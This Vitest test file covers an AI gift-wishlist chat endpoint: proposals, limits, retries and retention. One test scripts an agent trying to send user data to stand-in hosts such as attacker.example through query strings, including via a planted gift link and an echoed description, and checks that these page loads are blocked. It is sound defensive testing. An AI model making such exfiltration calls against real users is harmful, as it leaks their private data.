import {
	DB_READY,
	MANAGER_ID,
	RECIPIENT_ID,
	createGiftFixture,
	createWishlistFixture,
	readGift,
	removeFixtureRows,
	seedFixtureUsers,
} from '$lib/server/operations/operations.db.test-setup.js';
import { afterAll, beforeAll, beforeEach, describe, expect, it, vi } from 'vitest';
import type { BrowsePageConfig } from './browse_page.js';
import type * as ChatConfigModule from './chat_config.js';

const chatSwitches = vi.hoisted(() => ({
	allowed: true,
	killSwitch: false,
	pageBrowser: null as BrowsePageConfig | null,
}));

vi.mock('./chat_config.js', async (importOriginal) => ({
	...(await importOriginal<typeof ChatConfigModule>()),
	isChatAllowedFor: vi.fn(() => chatSwitches.allowed),
	isChatKillSwitchOn: vi.fn(() => chatSwitches.killSwitch),
	browsePageConfig: vi.fn(() => chatSwitches.pageBrowser),
}));

import { asc, eq } from 'drizzle-orm';
import { runAfterResponse } from '$lib/server/background.js';
import { getDb } from '$lib/server/db/index.js';
import { chatMessage, chatSession } from '$lib/server/db/chat.schema.js';
import { changeProposal } from '$lib/server/db/change_proposal.schema.js';
import { gift } from '$lib/server/db/gift.schema.js';
import { DAY_MS } from '$lib/server/operations/constants.js';
import { OPERATION_CHANNEL } from '$lib/server/operations/actor.js';
import { purgeAgentAccessRecords } from '$lib/server/agent_access/agent_access_purge.js';
import { applyChangeProposalRows } from '$lib/server/agent_access/change_proposals.js';
import { CHANGE_DECISION } from '$lib/modules/change_proposals/change_field_decisions.js';
import { CHANGE_PROPOSAL_STATUS } from '$lib/modules/change_proposals/types.js';
import * as m from '$lib/paraglide/messages.js';
import {
	CHAT_AVAILABILITY,
	CHAT_STREAM_EVENT,
	CHAT_TOOL_STATUS,
	CHAT_TOOL_SUMMARY,
	CHAT_TURN_ERROR,
	CHAT_TURN_KIND,
	type ChatStreamEvent,
	type ChatTurnRequest,
} from '$lib/modules/chat/types.js';
import { chatAvailability } from './chat_availability.js';
import { CHAT_GRANT_NAME } from './chat_agent.js';
import { handleChatTurnRequest } from './chat_endpoint.js';
import {
	CHAT_BLOCK,
	CHAT_MODEL_EVENT,
	CHAT_ROLE,
	CHAT_STOP_REASON,
	ChatProviderError,
	type ChatModelEvent,
	type ChatModelProvider,
	type ChatModelRequest,
	type ChatWebToolRecord,
} from './chat_model.js';
import {
	countUserMessagesSince,
	createChatSession,
	requireOwnChatSession,
	setChatFastForward,
	storeAssistantMessage,
	storeUserMessage,
} from './chat_store.js';
import { createFakeProvider } from './fake_provider.js';
import { CHAT_LIMITS, CHAT_RETENTION_MS, chatDayStart } from './limits.js';

const MANAGER = { id: MANAGER_ID, name: 'Manager', email: 'manager@example.com' };
const RECIPIENT = { id: RECIPIENT_ID, name: 'Recipient', email: 'recipient@example.com' };

type ChatUser = typeof MANAGER;

/** A provider answering each model call with the next scripted response, keeping its requests. */
function scriptedProvider(
	responses: ChatModelEvent[][],
	requests: ChatModelRequest[] = [],
): ChatModelProvider {
	let call = 0;
	return {
		async *stream(request) {
			requests.push(request);
			const response = responses[call];
			call += 1;
			if (response === undefined) {
				throw new Error('No scripted response left');
			}
			yield* response;
		},
	};
}

function failingProvider(): ChatModelProvider {
	return {
		stream: () => ({
			[Symbol.asyncIterator]: () => ({
				next: () =>
					Promise.reject(new ChatProviderError('The model API answered 529', true)),
			}),
		}),
	};
}

async function postTurn(
	chatUser: ChatUser,
	sessionId: string,
	request: ChatTurnRequest,
	provider: ChatModelProvider = createFakeProvider(),
): Promise<Response> {
	return handleChatTurnRequest(
		{
			request: new Request(`http://localhost/chat/${sessionId}/turns`, {
				method: 'POST',
				headers: { 'content-type': 'application/json' },
				body: JSON.stringify(request),
			}),
			params: { sessionId },
			locals: { user: chatUser },
		},
		() => provider,
	);
}

async function streamedEvents(response: Response): Promise<ChatStreamEvent[]> {
	expect(response.headers.get('content-type')).toContain('text/event-stream');
	const text = await response.text();
	return text
		.split('\n\n')
		.filter((chunk) => chunk.startsWith('data: '))
		.map((chunk) => JSON.parse(chunk.slice('data: '.length)) as ChatStreamEvent);
}

async function sendMessage(
	chatUser: ChatUser,
	sessionId: string,
	text: string,
	provider?: ChatModelProvider,
): Promise<ChatStreamEvent[]> {
	return streamedEvents(
		await postTurn(chatUser, sessionId, { kind: CHAT_TURN_KIND.message, text }, provider),
	);
}

function proposalEvent(events: readonly ChatStreamEvent[]) {
	const event = events.find((candidate) => candidate.type === CHAT_STREAM_EVENT.proposal);
	if (event?.type !== CHAT_STREAM_EVENT.proposal) {
		throw new Error(`No proposal among ${JSON.stringify(events)}`);
	}
	return event;
}

async function readProposal(proposalId: string) {
	const [row] = await getDb()
		.select()
		.from(changeProposal)
		.where(eq(changeProposal.id, proposalId));
	if (row === undefined) {
		throw new Error(`No proposal ${proposalId}`);
	}
	return row;
}

async function storedMessages(sessionId: string) {
	return getDb()
		.select()
		.from(chatMessage)
		.where(eq(chatMessage.sessionId, sessionId))
		.orderBy(asc(chatMessage.sequence));
}

async function newChat(chatUser: ChatUser = MANAGER, options: { sharedAt?: Date } = {}) {
	const wishlist = await createWishlistFixture(options);
	const session = await createChatSession(chatUser.id, wishlist.id);
	return { wishlist, session };
}

/** The tool results the model read back, parsed. */
async function toolResultsOf(sessionId: string): Promise<unknown[]> {
	return (await storedMessages(sessionId)).flatMap((message) =>
		message.content.flatMap((block) =>
			block.type === CHAT_BLOCK.toolResult ? [JSON.parse(block.content)] : [],
		),
	);
}

describe.skipIf(!DB_READY)('chat turns', () => {
	beforeAll(seedFixtureUsers);
	afterAll(removeFixtureRows);
	beforeEach(() => {
		chatSwitches.allowed = true;
		chatSwitches.killSwitch = false;
		chatSwitches.pageBrowser = null;
		// The shared database setup drops background work, but a turn runs as one.
		vi.mocked(runAfterResponse).mockImplementation((task) => void task());
	});

	it('streams a turn whose changes become a proposal the user reviews', async () => {
		const { wishlist, session } = await newChat();

		const events = await sendMessage(MANAGER, session.id, 'Přidejte Lego Technic');

		expect(events.map((event) => event.type)).toContain(CHAT_STREAM_EVENT.text);
		const toolStart = events.find(
			(event) => event.type === CHAT_STREAM_EVENT.tool && event.name === 'createGift',
		);
		expect(toolStart).toMatchObject({
			name: 'createGift',
			query: null,
			id: expect.any(String),
		});
		expect(events).toContainEqual(
			expect.objectContaining({
				type: CHAT_STREAM_EVENT.toolResult,
				id: toolStart?.type === CHAT_STREAM_EVENT.tool ? toolStart.id : undefined,
				status: CHAT_TOOL_STATUS.ok,
				error: null,
				summary: { kind: CHAT_TOOL_SUMMARY.proposal, applied: false },
			}),
		);
		// The API chat's users are not runner users, so its outcomes carry no debug view.
		expect(events.some((event) => 'debug' in event)).toBe(false);
		expect(events.at(-1)).toEqual({ type: CHAT_STREAM_EVENT.done });
		const { proposalId, applied } = proposalEvent(events);
		expect(applied).toBe(false);
		const proposal = await readProposal(proposalId);
		expect(proposal).toMatchObject({
			status: CHANGE_PROPOSAL_STATUS.pending,
			wishlistId: wishlist.id,
			submitterUserId: MANAGER_ID,
			channel: OPERATION_CHANNEL.chatbot,
			tokenName: CHAT_GRANT_NAME,
			tokenId: null,
			oauthGrantId: null,
		});
		expect(
			await getDb().select().from(gift).where(eq(gift.wishlistId, wishlist.id)),
		).toHaveLength(0);
		const messages = await storedMessages(session.id);
		expect(messages.map((message) => [message.role, message.proposalId])).toEqual([
			[CHAT_ROLE.user, null],
			[CHAT_ROLE.assistant, proposalId],
			[CHAT_ROLE.assistant, null],
		]);
		expect((await requireOwnChatSession(MANAGER_ID, session.id)).title).toBe(
			'Přidejte Lego Technic',
		);
	});

	it('applies ordinary changes at once when the chat fast-forwards', async () => {
		const { wishlist, session } = await newChat();
		await setChatFastForward(session.id, true);

		const { applied } = proposalEvent(await sendMessage(MANAGER, session.id, 'Přidejte Kolo'));

		expect(applied).toBe(true);
		const gifts = await getDb().select().from(gift).where(eq(gift.wishlistId, wishlist.id));
		expect(gifts.map((created) => created.name)).toEqual(['Kolo']);
	});

	it('leaves a deletion to its own confirmation even when the chat fast-forwards', async () => {
		const { wishlist, session } = await newChat();
		const giftId = await createGiftFixture(wishlist.id, { name: 'Kolo' });
		await setChatFastForward(session.id, true);

		const { proposalId, applied } = proposalEvent(
			await sendMessage(MANAGER, session.id, 'Smažte kolo'),
		);

		expect(applied).toBe(false);
		const proposal = await readProposal(proposalId);
		expect(proposal.status).toBe(CHANGE_PROPOSAL_STATUS.pending);
		expect(proposal.rows).toMatchObject([
			{ operation: 'deleteGift', requiresConfirmation: true },
		]);
		expect((await readGift(giftId)).deletedAt).toBeNull();
	});

	it('applies a reorder without review while fast-forward is off', async () => {
		const { wishlist, session } = await newChat();
		const first = await createGiftFixture(wishlist.id, { name: 'Kolo', sortOrder: 0 });
		const second = await createGiftFixture(wishlist.id, { name: 'Míč', sortOrder: 1 });

		const { applied } = proposalEvent(await sendMessage(MANAGER, session.id, 'Seřaďte dárky'));

		expect(applied).toBe(true);
		const order = await getDb()
			.select({ id: gift.id })
			.from(gift)
			.where(eq(gift.wishlistId, wishlist.id))
			.orderBy(asc(gift.sortOrder));
		expect(order.map((row) => row.id)).toEqual([second, first]);
	});

	it('shows a failed web search as an error and keeps its record out of the model history', async () => {
		const { session } = await newChat();
		const requests: ChatModelRequest[] = [];
		const failedFetch = (id: string): ChatModelEvent[] => [
			{
				type: CHAT_MODEL_EVENT.webTool,
				id,
				name: 'web_fetch',
				query: 'https://mycky.heureka.cz/',
				debugInput: '{ "url": "https://mycky.heureka.cz/" }',
			},
			{
				type: CHAT_MODEL_EVENT.webToolResult,
				id,
				error: { code: 'url_not_accessible', message: null },
				summary: null,
				debugResult: '{"type":"web_fetch_tool_error"}',
			},
		];
		const provider = scriptedProvider(
			[
				[
					...failedFetch('srvtoolu_1'),
					{ type: CHAT_MODEL_EVENT.textDelta, text: 'Stránka nejde načíst.' },
					{ type: CHAT_MODEL_EVENT.stop, reason: CHAT_STOP_REASON.endTurn },
				],
				[
					...failedFetch('srvtoolu_2'),
					{ type: CHAT_MODEL_EVENT.stop, reason: CHAT_STOP_REASON.endTurn },
				],
				[
					{ type: CHAT_MODEL_EVENT.textDelta, text: 'Dobře.' },
					{ type: CHAT_MODEL_EVENT.stop, reason: CHAT_STOP_REASON.endTurn },
				],
			],
			requests,
		);

		const events = await sendMessage(MANAGER, session.id, 'Kolik stojí myčka?', provider);

		expect(events.slice(0, 2)).toEqual([
			{
				type: CHAT_STREAM_EVENT.tool,
				id: 'srvtoolu_1',
				name: 'web_fetch',
				query: 'https://mycky.heureka.cz/',
			},
			{
				type: CHAT_STREAM_EVENT.toolResult,
				id: 'srvtoolu_1',
				status: CHAT_TOOL_STATUS.error,
				error: { code: 'url_not_accessible', message: null },
				durationMs: expect.any(Number),
				summary: null,
			},
		]);
		const [, answer] = await storedMessages(session.id);
		expect(answer?.content).toContainEqual(
			expect.objectContaining({
				type: CHAT_BLOCK.webTool,
				id: 'srvtoolu_1',
				isError: true,
				error: { code: 'url_not_accessible', message: null },
			} satisfies Partial<ChatWebToolRecord>),
		);

		await sendMessage(MANAGER, session.id, 'Zkuste to znovu', provider);
		await sendMessage(MANAGER, session.id, 'Nevadí', provider);

		const followUp = requests.at(-1);
		expect(JSON.stringify(followUp?.messages)).not.toContain(CHAT_BLOCK.webTool);
		expect(followUp?.messages).toEqual([
			{
				role: CHAT_ROLE.user,
				content: [{ type: CHAT_BLOCK.text, text: 'Kolik stojí myčka?' }],
			},
			{
				role: CHAT_ROLE.assistant,
				content: [{ type: CHAT_BLOCK.text, text: 'Stránka nejde načíst.' }],
			},
			{ role: CHAT_ROLE.user, content: [{ type: CHAT_BLOCK.text, text: 'Zkuste to znovu' }] },
			{ role: CHAT_ROLE.user, content: [{ type: CHAT_BLOCK.text, text: 'Nevadí' }] },
		]);
	});

	it('counts only the messages a model reads toward its context window', async () => {
		const { session } = await newChat();
		await storeUserMessage(session, 'První zpráva');
		for (let index = 0; index < CHAT_LIMITS.contextMessages; index += 1) {
			await storeAssistantMessage(
				session.id,
				[
					{
						type: CHAT_BLOCK.webTool,
						id: `srvtoolu_${index}`,
						name: 'web_search',
						query: 'myčka',
						isError: false,
						error: null,
						summary: null,
						durationMs: 100,
						debug: null,
					},
				],
				null,
			);
		}
		const requests: ChatModelRequest[] = [];
		const provider = scriptedProvider(
			[
				[
					{ type: CHAT_MODEL_EVENT.textDelta, text: 'Dobře.' },
					{ type: CHAT_MODEL_EVENT.stop, reason: CHAT_STOP_REASON.endTurn },
				],
			],
			requests,
		);

		await sendMessage(MANAGER, session.id, 'Druhá zpráva', provider);

		expect(requests[0]?.messages.map((message) => message.content)).toEqual([
			[{ type: CHAT_BLOCK.text, text: 'První zpráva' }],
			[{ type: CHAT_BLOCK.text, text: 'Druhá zpráva' }],
		]);
	});

	it('gives a recipient the UI’s own refusal and no reservation data', async () => {
		const { wishlist, session } = await newChat(RECIPIENT, { sharedAt: new Date() });
		const giftId = await createGiftFixture(wishlist.id, { name: 'Kolo' });
		const provider = scriptedProvider([
			[
				{
					type: CHAT_MODEL_EVENT.toolCall,
					id: 'read',
					name: 'readWishlistGifts',
					input: { wishlistShortId: wishlist.shortId },
				},
				{
					type: CHAT_MODEL_EVENT.toolCall,
					id: 'reserve',
					name: 'reserveGift',
					input: { giftId, quantity: 1 },
				},
				{ type: CHAT_MODEL_EVENT.stop, reason: CHAT_STOP_REASON.toolUse },
			],
			[
				{ type: CHAT_MODEL_EVENT.textDelta, text: 'Nelze.' },
				{ type: CHAT_MODEL_EVENT.stop, reason: CHAT_STOP_REASON.endTurn },
			],
		]);

		await sendMessage(RECIPIENT, session.id, 'Zarezervujte mi kolo', provider);

		const [readResult, reserveResult] = await toolResultsOf(session.id);
		expect(JSON.stringify(readResult)).not.toMatch(/reserv/i);
		expect(reserveResult).toMatchObject({
			error: { message: m.server_error_recipient_cannot_reserve_own_gifts() },
		});
	});

	it('keeps the user’s message after a failed answer and resumes on retry', async () => {
		const { session } = await newChat();

		const failed = await sendMessage(MANAGER, session.id, 'Přidejte Kolo', failingProvider());

		expect(failed.at(-1)).toEqual({
			type: CHAT_STREAM_EVENT.error,
			error: CHAT_TURN_ERROR.providerFailed,
		});
		expect((await storedMessages(session.id)).map((message) => message.role)).toEqual([
			CHAT_ROLE.user,
		]);
		const retried = await streamedEvents(
			await postTurn(MANAGER, session.id, { kind: CHAT_TURN_KIND.retry }),
		);
		expect(retried.at(-1)).toEqual({ type: CHAT_STREAM_EVENT.done });
		expect(proposalEvent(retried).applied).toBe(false);
		const nothingToRetry = await postTurn(MANAGER, session.id, { kind: CHAT_TURN_KIND.retry });
		expect(nothingToRetry.status).toBe(409);
	});

	it('keeps the text the user already read when the browser goes away mid-answer', async () => {
		const { session } = await newChat();
		const provider: ChatModelProvider = {
			async *stream(_request, signal) {
				yield { type: CHAT_MODEL_EVENT.textDelta, text: 'Hledám vhodné ' };
				yield { type: CHAT_MODEL_EVENT.textDelta, text: 'dárky…' };
				await new Promise((_resolve, reject) => {
					signal.addEventListener('abort', () => reject(signal.reason as Error));
				});
			},
		};
		const response = await postTurn(
			MANAGER,
			session.id,
			{ kind: CHAT_TURN_KIND.message, text: 'Najděte dárky' },
			provider,
		);
		const reader = response.body!.getReader();
		let streamed = '';
		while (!streamed.includes('dárky…')) {
			const { value } = await reader.read();
			streamed += new TextDecoder().decode(value);
		}

		await reader.cancel();

		await vi.waitFor(async () => {
			const messages = await storedMessages(session.id);
			expect(messages.map((message) => [message.role, message.content])).toEqual([
				[CHAT_ROLE.user, [{ type: CHAT_BLOCK.text, text: 'Najděte dárky' }]],
				[CHAT_ROLE.assistant, [{ type: CHAT_BLOCK.text, text: 'Hledám vhodné dárky…' }]],
			]);
		});
	});

	it('stops a turn that keeps calling tools at the step limit', async () => {
		const { wishlist, session } = await newChat();
		const readAgain: ChatModelEvent[] = [
			{
				type: CHAT_MODEL_EVENT.toolCall,
				id: 'read',
				name: 'readWishlistGifts',
				input: { wishlistShortId: wishlist.shortId },
			},
			{ type: CHAT_MODEL_EVENT.stop, reason: CHAT_STOP_REASON.toolUse },
		];
		const provider: ChatModelProvider = {
			async *stream() {
				yield* readAgain.map((event) =>
					event.type === CHAT_MODEL_EVENT.toolCall
						? { ...event, id: crypto.randomUUID() }
						: event,
				);
			},
		};

		const events = await sendMessage(MANAGER, session.id, 'Čtěte pořád', provider);

		expect(events.at(-1)).toEqual({
			type: CHAT_STREAM_EVENT.error,
			error: CHAT_TURN_ERROR.incomplete,
		});
		expect(
			(await storedMessages(session.id)).filter(
				(message) => message.role === CHAT_ROLE.assistant,
			),
		).toHaveLength(CHAT_LIMITS.modelCallsPerTurn);
	});

	it('opens only pages whose address the user, a web search or an opened page brought into the chat', async () => {
		const { wishlist, session } = await newChat();
		const storedLink = 'http://attacker.example/?d=Ulozeno';
		await createGiftFixture(wishlist.id, { name: 'Míč', links: [{ url: storedLink }] });
		chatSwitches.pageBrowser = { accountId: 'account-1', apiToken: 'browser-token' };
		const loadPage = vi.fn<typeof fetch>(async () =>
			Response.json({
				success: true,
				result: 'Recenze: https://shop.example.cz/kolo/recenze',
			}),
		);
		vi.stubGlobal('fetch', loadPage);
		const browse = (id: string, url: string): ChatModelEvent => ({
			type: CHAT_MODEL_EVENT.toolCall,
			id,
			name: 'browse_page',
			input: { url },
		});
		const echoedUrl = 'https://attacker.example/?d=Kolo';
		const provider = scriptedProvider([
			[
				{ type: CHAT_MODEL_EVENT.textDelta, text: 'Zkusím https://evil.example/x' },
				{ type: CHAT_MODEL_EVENT.webSources, urls: ['https://www.heureka.cz/kolo'] },
				browse('user-url', 'https://shop.example.cz/kolo'),
				browse('assistant-url', 'https://evil.example/x'),
				{
					type: CHAT_MODEL_EVENT.toolCall,
					id: 'read-gifts',
					name: 'readWishlistGifts',
					input: { wishlistShortId: wishlist.shortId },
				},
				{ type: CHAT_MODEL_EVENT.stop, reason: CHAT_STOP_REASON.toolUse },
			],
			[
				browse('search-url', 'https://www.heureka.cz/kolo'),
				browse('page-url', 'https://shop.example.cz/kolo/recenze'),
				browse('exfiltration', 'https://attacker.example/?d=V%C3%A1noce'),
				browse('stored-link', storedLink),
				{
					type: CHAT_MODEL_EVENT.toolCall,
					id: 'echo-gift',
					name: 'createGift',
					input: {
						wishlistId: wishlist.id,
						name: 'Kolo',
						description: `Viz ${echoedUrl}`,
					},
				},
				{ type: CHAT_MODEL_EVENT.stop, reason: CHAT_STOP_REASON.toolUse },
			],
			[
				browse('echoed-url', echoedUrl),
				{ type: CHAT_MODEL_EVENT.stop, reason: CHAT_STOP_REASON.toolUse },
			],
			[
				{ type: CHAT_MODEL_EVENT.textDelta, text: 'Hotovo.' },
				{ type: CHAT_MODEL_EVENT.stop, reason: CHAT_STOP_REASON.endTurn },
			],
		]);

		try {
			await sendMessage(
				MANAGER,
				session.id,
				'Najděte recenze https://shop.example.cz/kolo',
				provider,
			);
		} finally {
			vi.unstubAllGlobals();
		}

		const resultsByCallId = new Map(
			(await storedMessages(session.id)).flatMap((message) =>
				message.content.flatMap((block) =>
					block.type === CHAT_BLOCK.toolResult ? [[block.toolCallId, block.content]] : [],
				),
			),
		);
		const outcomeOf = (callId: string) => {
			const result: unknown = JSON.parse(resultsByCallId.get(callId) ?? 'null');
			return typeof result === 'object' && result !== null && 'error' in result
				? (result.error as { code: string }).code
				: 'opened';
		};
		expect(resultsByCallId.get('read-gifts')).toContain(storedLink);
		expect(resultsByCallId.get('echo-gift')).toContain(echoedUrl);
		expect(
			[
				'user-url',
				'assistant-url',
				'search-url',
				'page-url',
				'exfiltration',
				'stored-link',
				'echoed-url',
			].map(outcomeOf),
		).toEqual([
			'opened',
			'URL_NOT_IN_CONVERSATION',
			'opened',
			'opened',
			'URL_NOT_IN_CONVERSATION',
			'URL_NOT_IN_CONVERSATION',
			'URL_NOT_IN_CONVERSATION',
		]);
		expect(loadPage).toHaveBeenCalledTimes(3);
		expect(JSON.stringify(loadPage.mock.calls)).not.toContain('attacker.example');
	});

	it('refuses turns outside the allowlist, under the kill switch and past the daily cap', async () => {
		const { session } = await newChat();
		const request = { kind: CHAT_TURN_KIND.message, text: 'Ahoj' } as const;

		chatSwitches.allowed = false;
		const notAllowed = await postTurn(MANAGER, session.id, request);
		expect(notAllowed.status).toBe(403);
		expect(await notAllowed.json()).toMatchObject({
			error: { availability: CHAT_AVAILABILITY.notAllowed },
		});

		chatSwitches.allowed = true;
		chatSwitches.killSwitch = true;
		expect(await chatAvailability(MANAGER)).toBe(CHAT_AVAILABILITY.disabled);

		chatSwitches.killSwitch = false;
		const now = new Date();
		const used =
			CHAT_LIMITS.userMessagesPerDay -
			(await countUserMessagesSince(chatDayStart(now), MANAGER_ID));
		await getDb()
			.insert(chatMessage)
			.values(
				Array.from({ length: Math.max(used, 0) }, () => ({
					sessionId: session.id,
					role: CHAT_ROLE.user,
					content: [{ type: CHAT_BLOCK.text, text: 'Ahoj' } as const],
					createdAt: now,
				})),
			);
		expect(await chatAvailability(MANAGER, now)).toBe(CHAT_AVAILABILITY.dailyCapReached);
		expect((await postTurn(MANAGER, session.id, request)).status).toBe(403);
		await getDb().delete(chatMessage).where(eq(chatMessage.sessionId, session.id));
	});

	it('refuses every user’s turns once all users together reach the global daily cap', async () => {
		const { session: managerSession } = await newChat();
		const { session: recipientSession } = await newChat(RECIPIENT, { sharedAt: new Date() });
		const request = { kind: CHAT_TURN_KIND.message, text: 'Ahoj' } as const;
		const now = new Date();
		const remaining =
			CHAT_LIMITS.globalMessagesPerDay -
			(await countUserMessagesSince(chatDayStart(now), null));
		const fillMessages = (sessionId: string, count: number) =>
			getDb()
				.insert(chatMessage)
				.values(
					Array.from({ length: count }, () => ({
						sessionId,
						role: CHAT_ROLE.user,
						content: [{ type: CHAT_BLOCK.text, text: 'Ahoj' } as const],
						createdAt: now,
					})),
				);
		try {
			await fillMessages(managerSession.id, Math.max(remaining - 1, 0));
			expect(await chatAvailability(RECIPIENT, now)).toBe(CHAT_AVAILABILITY.available);

			await fillMessages(managerSession.id, 1);

			expect(await chatAvailability(RECIPIENT, now)).not.toBe(CHAT_AVAILABILITY.available);
			expect(await chatAvailability(MANAGER, now)).not.toBe(CHAT_AVAILABILITY.available);
			const refused = await postTurn(RECIPIENT, recipientSession.id, request);
			expect(refused.status).toBe(403);
			expect(await storedMessages(recipientSession.id)).toHaveLength(0);
		} finally {
			await getDb().delete(chatMessage).where(eq(chatMessage.sessionId, managerSession.id));
		}
	});

	it('turns a bulk edit of several gifts into one proposal the user reviews', async () => {
		const { wishlist, session } = await newChat();
		const bikeId = await createGiftFixture(wishlist.id, { name: 'Kolo' });
		const ballId = await createGiftFixture(wishlist.id, { name: 'Míč' });
		const bookId = await createGiftFixture(wishlist.id, { name: 'Kniha' });
		const provider = scriptedProvider([
			[
				{
					type: CHAT_MODEL_EVENT.toolCall,
					id: 'bulk',
					name: 'bulkUpdateGifts',
					input: {
						wishlistId: wishlist.id,
						giftIds: [bikeId, ballId],
						action: 'received',
						received: true,
					},
				},
				{ type: CHAT_MODEL_EVENT.stop, reason: CHAT_STOP_REASON.toolUse },
			],
			[
				{ type: CHAT_MODEL_EVENT.textDelta, text: 'Navrhuji to.' },
				{ type: CHAT_MODEL_EVENT.stop, reason: CHAT_STOP_REASON.endTurn },
			],
		]);

		const events = await sendMessage(
			MANAGER,
			session.id,
			'Označte kolo a míč jako obdržené',
			provider,
		);

		const proposals = events.filter((event) => event.type === CHAT_STREAM_EVENT.proposal);
		expect(proposals).toHaveLength(1);
		const { proposalId, applied } = proposalEvent(events);
		expect(applied).toBe(false);
		const proposal = await readProposal(proposalId);
		expect(proposal.status).toBe(CHANGE_PROPOSAL_STATUS.pending);
		expect((await readGift(bikeId)).received).toBe(false);
		expect((await readGift(ballId)).received).toBe(false);

		const result = await applyChangeProposalRows(
			MANAGER,
			proposalId,
			proposal.rows.map((row) => ({ rowId: row.rowId, decision: CHANGE_DECISION.accepted })),
		);

		expect(result.outcome).toBe('applied');
		expect((await readGift(bikeId)).received).toBe(true);
		expect((await readGift(ballId)).received).toBe(true);
		expect((await readGift(bookId)).received).toBe(false);
	});

	it('still applies a chat’s proposal while the chat is switched off', async () => {
		const { wishlist, session } = await newChat();
		const { proposalId } = proposalEvent(
			await sendMessage(MANAGER, session.id, 'Přidejte Kolo'),
		);
		chatSwitches.killSwitch = true;

		const result = await applyChangeProposalRows(MANAGER, proposalId, [
			{ rowId: 'r1', decision: CHANGE_DECISION.accepted },
		]);

		expect(result.outcome).toBe('applied');
		const gifts = await getDb().select().from(gift).where(eq(gift.wishlistId, wishlist.id));
		expect(gifts.map((created) => created.name)).toEqual(['Kolo']);
	});

	it('deletes chats 30 days after their last turn', async () => {
		const now = new Date();
		const { session: expired } = await newChat();
		const { session: kept } = await newChat();
		await sendMessage(MANAGER, expired.id, 'Ahoj');
		await getDb()
			.update(chatSession)
			.set({ lastTurnAt: new Date(now.getTime() - CHAT_RETENTION_MS - DAY_MS) })
			.where(eq(chatSession.id, expired.id));
		await getDb()
			.update(chatSession)
			.set({ lastTurnAt: new Date(now.getTime() - CHAT_RETENTION_MS + DAY_MS) })
			.where(eq(chatSession.id, kept.id));

		await purgeAgentAccessRecords(now);

		const remaining = await getDb()
			.select({ id: chatSession.id })
			.from(chatSession)
			.where(eq(chatSession.userId, MANAGER_ID));
		expect(remaining.map((row) => row.id)).toContain(kept.id);
		expect(remaining.map((row) => row.id)).not.toContain(expired.id);
		expect(await storedMessages(expired.id)).toHaveLength(0);
	});
});
